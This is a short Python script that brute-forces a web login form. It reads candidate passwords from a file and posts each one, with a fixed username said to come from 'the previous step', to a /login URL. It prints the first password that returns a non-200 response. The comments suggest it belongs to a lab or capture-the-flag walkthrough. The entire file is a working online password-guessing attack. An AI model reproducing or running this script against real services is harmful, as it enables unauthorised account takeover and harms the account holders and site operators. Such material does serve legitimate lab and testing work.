import requests

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the passwords in a file called passwords.txt
file_path = 'passwords.txt'

#replace john with the user you found in the previous step
user = 'john'

# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        password = line.strip()
    
        data = {
        'username': user,
        'password': password
        }
        
        response = requests.post(url, data=data, allow_redirects=False)
        status_code = response.status_code
    
        if status_code!=200:
            print(password)
            break  
      